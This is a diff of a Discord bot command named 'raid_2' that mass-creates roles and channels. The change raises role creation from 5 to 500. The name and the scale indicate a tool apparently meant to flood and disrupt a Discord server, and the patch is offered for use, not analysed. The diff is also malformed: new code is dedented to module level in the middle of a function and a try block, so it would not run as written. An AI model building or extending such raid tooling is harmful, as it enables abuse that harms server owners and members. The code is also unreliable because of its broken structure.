@@ -31,7 +31,7 @@ async def on_ready():
 # CREATE SALONS
 # =========================
 @bot.tree.command(
-    name=""raid_2"",
+    name="raid_2",
     description="Crée des salons et des rôles"
 )
 @app_commands.describe(
@@ -78,7 +78,7 @@ async def raid_2(
 
     # rôles
     try:
-        for i in range(5):
+        for i in range(500):
             await guild.create_role(name=f"{nom_role}-{i + 1}")
     except Exception as e:
         await interaction.edit_original_response(
@@ -92,12 +92,19 @@ async def raid_2(
         try:
             from discord import CategoryChannel
 
-if isinstance(categorie, CategoryChannel):
-    pass
-else:
+categorie = None
+
+if categorie_id:
+    try:
+        categorie = guild.get_channel(int(categorie_id))
+    except:
+        categorie = None
+
+# vérifie que c'est bien une catégorie
+from discord import CategoryChannel
+
+if not isinstance(categorie, CategoryChannel):
     categorie = None
-        except:
-            pass
 
     semaphore = asyncio.Semaphore(10)
 
